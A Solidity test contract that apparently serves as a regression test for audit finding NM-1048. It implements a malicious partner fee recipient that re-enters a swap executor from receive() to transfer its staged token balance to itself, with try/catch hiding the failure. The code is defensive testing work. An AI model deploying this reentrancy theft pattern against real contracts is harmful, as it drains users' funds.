// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IExecutor } from "../../src/interfaces/IExecutor.sol";
import { WeirollTestHelper } from "../helpers/WeirollTestHelper.sol";

/// @title ReentrantPartner
/// @notice Malicious `partnerRecipient` for Nethermind NM-1048: when the Router pays it a
///         native-ETH partner fee mid-`swapMulti`, earlier input slots are already staged on the
///         executor. From `receive()` it calls `executor.executePath` with a program that
///         transfers the executor's whole `token` balance to itself, inside a `try/catch` so the
///         outer swap still completes and the theft would leave no trace. Records whether the
///         attempt succeeded and, if not, the revert selector.
contract ReentrantPartner {
    IExecutor public immutable executor;
    address public immutable token;

    bool public attackAttempted;
    bool public attackSucceeded;
    bytes4 public lastRevertSelector;
    uint256 public stolen;

    constructor(IExecutor _executor, address _token) {
        executor = _executor;
        token = _token;
    }

    receive() external payable {
        _attack();
    }

    function _attack() internal {
        attackAttempted = true;
        uint256 staged = IERC20(token).balanceOf(address(executor));

        bytes[] memory state = new bytes[](2);
        state[0] = WeirollTestHelper.encodeAddress(address(this));
        state[1] = WeirollTestHelper.encodeUint256(staged);
        bytes32[] memory commands = new bytes32[](1);
        commands[0] = WeirollTestHelper.buildTransferCommand(token, 0, 1);

        try executor.executePath(commands, state) {
            attackSucceeded = true;
            stolen = IERC20(token).balanceOf(address(this));
        } catch (bytes memory reason) {
            attackSucceeded = false;
            if (reason.length >= 4) lastRevertSelector = bytes4(reason);
        }
    }
}
